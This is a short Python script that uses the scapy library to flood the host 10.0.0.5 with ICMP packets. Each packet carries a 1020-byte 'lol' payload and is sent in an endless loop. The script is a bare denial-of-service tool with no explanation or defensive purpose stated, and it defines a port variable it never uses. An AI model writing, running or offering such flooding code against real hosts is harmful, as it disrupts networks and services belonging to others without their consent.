from scapy.all import *

target_ip = "10.0.0.5"
target_port = 80

ip = IP(dst=target_ip)


icmp = ICMP()
lol = Raw(b"lol"*340)

packet = ip / icmp / lol

send(packet,loop=1,verbose=1)
